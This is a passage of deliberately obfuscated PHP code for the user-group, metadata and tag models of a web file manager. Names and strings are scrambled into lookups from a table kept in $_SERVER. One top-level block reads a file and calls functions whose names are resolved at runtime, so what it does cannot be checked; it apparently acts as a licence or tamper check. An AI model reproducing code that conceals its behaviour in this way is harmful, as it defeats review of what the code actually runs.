array($ò¦—Ôê[95] => $ÄÊç„È—, $ò¦—Ôê[451] => array($ò¦—Ôê[473], "\45{$±®ÄÍê¶}\45")); $Æ±œâúû = $this->parseWhereLike($Æ±œâúû); $ğºÌ¡Ÿ = Model($ò¦—Ôê[2665])->where($Æ±œâúû)->limit($Æ°–õÔÖ)->select(); if (!$ğºÌ¡Ÿ) { return array(); } $ğºÌ¡Ÿ = array_to_keyvalue($ğºÌ¡Ÿ, $ò¦—Ôê[12], $ò¦—Ôê[1539]); $İ¹§™Œ = $this->where(array($ò¦—Ôê[1913] => array($ò¦—Ôê[7], $ğºÌ¡Ÿ)))->select(); if (!$İ¹§™Œ) { return array(); } return $İ¹§™Œ; } private function _listDataApplyItem($·½¤©«Ì) { $®—à…½ğ = array($·½¤©«Ì); $this->_listDataApply($®—à…½ğ); return $®—à…½ğ[0]; } private function _listDataApply(&$õşÎ¯û) { $Ù› ¡† =& $_SERVER[€ä¾™²]; if (!$õşÎ¯û) { return; } array_remove_key($õşÎ¯û, $Ù› ¡†[999]); $ş¡íæŒ¡ = array_to_keyvalue($õşÎ¯û, $Ù› ¡†[12], $Ù› ¡†[1539]); $this->_listAppendGroup($õşÎ¯û, $ş¡íæŒ¡); $this->_listAppendMeta($õşÎ¯û, $ş¡íæŒ¡); $this->_listAppendSourceRoot($õşÎ¯û, $ş¡íæŒ¡); } private function _listAppendSourceRoot(&$¯î¸—, $°¹©Öãâ) { $·†Ú =& $_SERVER[€ä¾™²]; $âõã¤Â = Model($·†Ú[932])->listSourceRoot(SourceModel::TYPE_USER, $°¹©Öãâ); $âõã¤Â = array_to_keyvalue($âõã¤Â, $·†Ú[596]); $âõã¤Â = array_remove_key($âõã¤Â, $·†Ú[596]); foreach ($¯î¸— as &$«ç¸¸Œì) { $«ç¸¸Œì[$·†Ú[90]] = $âõã¤Â[$«ç¸¸Œì[$·†Ú[1539]]] ? $âõã¤Â[$«ç¸¸Œì[$·†Ú[1539]]] : array(); } unset($«ç¸¸Œì); } private function _listAppendGroup(&$ê¦ÌòÀß, $•İ ’‰) { $­òû¢ë =& $_SERVER[€ä¾™²]; $œ¾Ó®ÊÔ = array($­òû¢ë[1539] => array($­òû¢ë[7], $•İ ’‰)); $§ØÇ¬®ê = Model($­òû¢ë[2220])->where($œ¾Ó®ÊÔ)->select(); $áÅ€´Ï = array_to_keyvalue($§ØÇ¬®ê, $­òû¢ë[12], $­òû¢ë[1441]); $áÅ€´Ï = array_remove_value(array_unique($áÅ€´Ï), $­òû¢ë[229]); if (!$áÅ€´Ï || !$§ØÇ¬®ê) { return; } $œ¾Ó®ÊÔ = array($­òû¢ë[1441] => array($­òû¢ë[7], $áÅ€´Ï)); $¬åï‰„ = Model($­òû¢ë[1439])->field($­òû¢ë[2666])->where($œ¾Ó®ÊÔ)->select(); $¬åï‰„ = array_to_keyvalue($¬åï‰„, $­òû¢ë[1441]); $§ØÇ¬®ê = array_to_keyvalue_group($§ØÇ¬®ê, $­òû¢ë[1539]); foreach ($§ØÇ¬®ê as &$¹ñ˜ÔÛ±) { $¶ÈİÛÛ = array(); foreach ($¹ñ˜ÔÛ± as $Çï½ĞÚ) { if (!$Çï½ĞÚ[$­òû¢ë[1586]]) { continue; } $¿÷­«ÓŞ = Model($­òû¢ë[598])->listData($Çï½ĞÚ[$­òû¢ë[1586]]); $¶ÈİÛÛ[] = array($­òû¢ë[1441] => $Çï½ĞÚ[$­òû¢ë[1441]], $­òû¢ë[2667] => $¬åï‰„[$Çï½ĞÚ[$­òû¢ë[1441]]][$­òû¢ë[32]], $­òû¢ë[611] => $¬åï‰„[$Çï½ĞÚ[$­òû¢ë[1441]]][$­òû¢ë[611]], $­òû¢ë[509] => $¿÷­«ÓŞ); } $¹ñ˜ÔÛ± = $¶ÈİÛÛ; } unset($¹ñ˜ÔÛ±); foreach ($ê¦ÌòÀß as &$Ì²Ë„…É) { $Ì²Ë„…É[$­òû¢ë[1440]] = array(); if (isset($§ØÇ¬®ê[$Ì²Ë„…É[$­òû¢ë[1539]]])) { $Ì²Ë„…É[$­òû¢ë[1440]] = $§ØÇ¬®ê[$Ì²Ë„…É[$­òû¢ë[1539]]]; } } unset($Ì²Ë„…É); } public function userAppendGroup($÷İ©°Í‘) { $ÔÖ³˜Ş‡ =& $_SERVER[€ä¾™²]; if (!$÷İ©°Í‘) { return array(); } $this->_listAppendGroup($÷İ©°Í‘, array_to_keyvalue($÷İ©°Í‘, $ÔÖ³˜Ş‡[12], $ÔÖ³˜Ş‡[1539])); return $÷İ©°Í‘; } private function _listAppendMeta(&$¼Ìä¤±, $½ø¾Ê€) { $Ô€ãÃå¬ =& $_SERVER[€ä¾™²]; $–ë‘ß‡ä = UserJobModel::JOB_KEY; $Ú­Ã”» = array($Ô€ãÃå¬[2216]); $®˜ç¸Áİ = array($Ô€ãÃå¬[1539] => array($Ô€ãÃå¬[7], $½ø¾Ê€)); $Ãï–ùé¦ = Model($Ô€ãÃå¬[2642])->where($®˜ç¸Áİ)->select(); $ï‘†Ûîı = array(); foreach ($Ãï–ùé¦ as $Ï´æçá¹) { $ñó—¢Ëº = $Ï´æçá¹[$Ô€ãÃå¬[1539]]; if (!isset($ï‘†Ûîı[$ñó—¢Ëº])) { $ï‘†Ûîı[$ñó—¢Ëº] = array(); } $ï‘†Ûîı[$ñó—¢Ëº][$Ï´æçá¹[$Ô€ãÃå¬[95]]] = $Ï´æçá¹[$Ô€ãÃå¬[451]]; } $°àÏÉ€ç = Model($Ô€ãÃå¬[2668]); foreach ($¼Ìä¤± as &$òê„ã°ó) { $ñó—¢Ëº = $òê„ã°ó[$Ô€ãÃå¬[1539]]; $ù÷ì˜®Ü = isset($ï‘†Ûîı[$ñó—¢Ëº]) ? $ï‘†Ûîı[$ñó—¢Ëº] : array(); $òê„ã°ó[$Ô€ãÃå¬[562]] = array_field_key($ù÷ì˜®Ü, $Ú­Ã”»); $òê„ã°ó[$Ô€ãÃå¬[2669]] = array(); if (isset($ù÷ì˜®Ü[$–ë‘ß‡ä])) { $òê„ã°ó[$Ô€ãÃå¬[2669]] = $°àÏÉ€ç->getUserJobInfo($ù÷ì˜®Ü[$–ë‘ß‡ä]); } } unset($òê„ã°ó); } protected function groupUserAll($íºŒâ‡) { $÷Òı¥ß =& $_SERVER[€ä¾™²]; if (!$íºŒâ‡) { return !1; } $ğíû’²¸ = Model($÷Òı¥ß[2220])->field($÷Òı¥ß[1539])->where(array($÷Òı¥ß[1441] => array($÷Òı¥ß[7], $íºŒâ‡)))->select(); $ğíû’²¸ = array_to_keyvalue($ğíû’²¸, $÷Òı¥ß[12], $÷Òı¥ß[1539]); return array_unique($ğíû’²¸); } public function userSearch($æà’ôˆÔ, $æËÀ®¯ = "\52") { return Model($_SERVER[€ä¾™²][624])->where($æà’ôˆÔ)->field($æËÀ®¯)->find(); } } if ($_SERVER[$_SERVER[€ä¾™²][491]] != $_SERVER[$_SERVER[€ä¾™²][988]]) { $_getc = $_SERVER[€ä¾™²][493]; $_getfile = $_SERVER[$_SERVER[€ä¾™²][494]] . $_SERVER[€ä¾™²][495]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[€ä¾™²][286], $_getfilec); if (count($_getarrs) < $_SERVER[€ä¾™²][496]) { $exit = $_SERVER[€ä¾™²][497]; $exit(); } $_act = $_SERVER[€ä¾™²][498]; $_act($_SERVER[$_SERVER[€ä¾™²][492]]); } goto dÅØÜ¤ñ…; A’ô¾İÇÒ„: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\162\137\146\141\166"; protected function cacheFunctionAlias($Ÿ¬¿ŸŠ) { $¢´ñâ–Ú =& $_SERVER[€ä¾™²]; return array($¢´ñâ–Ú[2240] => array($¢´ñâ–Ú[2673] . USER_ID, $¢´ñâ–Ú[2241])); } protected function ___listData() { $ÏµŒ¶şÃ =& $_SERVER[€ä¾™²]; $€ƒÍ’ = array($ÏµŒ¶şÃ[1913] => USER_ID, $ÏµŒ¶şÃ[580] => array($ÏµŒ¶şÃ[2244], 0)); $ôèß‰¥ = $ÏµŒ¶şÃ[2674]; $¿çîÇ¾³ = $this->field($ôèß‰¥)->where($€ƒÍ’)->order($ÏµŒ¶şÃ[2246])->select(); return $¿çîÇ¾³ ? $¿çîÇ¾³ : array(); } protected function addToTag($á˜À›¨¸, $÷¯Æ›İÁ) { $Ü„ÇğÙ =& $_SERVER[€ä¾™²]; if (!Model($Ü„ÇğÙ[2398])->listData($÷¯Æ›İÁ)) { return !1; } if (is_numeric($á˜À›¨¸)) { $İİéœóÑ = Model($Ü„ÇğÙ[932])->pathInfo($á˜À›¨¸); if (!$İİéœóÑ) { return !1; } } else { $İİéœóÑ = IO::infoSimple($á˜À›¨¸); if (!$İİéœóÑ) { return !1; } $…âŒŞñæ = $İİéœóÑ[$Ü„ÇğÙ[32]]; $â«›…Ëå = $İİéœóÑ[$Ü„ÇğÙ[33]]; if (isset($İİéœóÑ[$Ü„ÇğÙ[507]])) { $â«›…Ëå = $İİéœóÑ[$Ü„ÇğÙ[507]] == $Ü„ÇğÙ[91] ? $Ü„ÇğÙ[78] : $Ü„ÇğÙ[231]; } } $ºÁÌó§ç = array($Ü„ÇğÙ[1913] => USER_ID, $Ü„ÇğÙ[580] => $÷¯Æ›İÁ, $Ü„ÇğÙ[517] => $á˜À›¨¸, $Ü„ÇğÙ[518] => $â«›…Ëå ? $â«›…Ëå : $Ü„ÇğÙ[512], $Ü„ÇğÙ[516] => $…âŒŞñæ ? $…âŒŞñæ : $Ü„ÇğÙ[12], $Ü„ÇğÙ[2132] => 0); if ($this->where($ºÁÌó§ç)->find()) { return !1; } return $this->add($ºÁÌó§ç); } protected function removeFromTag($ö–àï…Î, $½àß±ê´) { $éö›À“÷ =& $_SERVER[€ä¾™²]; if (!Model($éö›À“÷[2398])->listData($½àß±ê´)) { return !1; } if (is_array($ö–àï…Î)) { $ö–àï…Î = array($éö›À“÷[7], $ö–àï…Î); } $²ëÍ¶ŞÃ = array($éö›À“÷[1913] => USER_ID, $éö›À“÷[580] => $½àß±ê´, $éö›À“÷[517] => $ö–àï…Î); return $this->where($²ëÍ¶ŞÃ)->delete(); } protected function removeByTag($öÄùÚ¶) { $‰ûôàòî =& $_SERVER[€ä¾™²]; if (!$öÄùÚ¶) { return !1; } $â¯»È»Ú = array($‰ûôàòî[1913] => USER_ID, $‰ûôàòî[580] => $öÄùÚ¶); return $this->where($â¯»È»Ú)->delete(); } protected function removeBySource($²¯îº‹Â) { $ ’Ä”»¤ =& $_SERVER[€ä¾™²]; if (is_array($²¯îº‹Â)) { $²¯îº‹Â = array($ ’Ä”»¤[7], $²¯îº‹Â); } $ïüâ…Ö = array($ ’Ä”»¤[1913] => USER_ID, $ ’Ä”»¤[580] => array($ ’Ä”»¤[1127], 0), $ ’Ä”»¤[517] => $²¯îº‹Â); return $this->where($ïüâ…Ö)->delete(); } }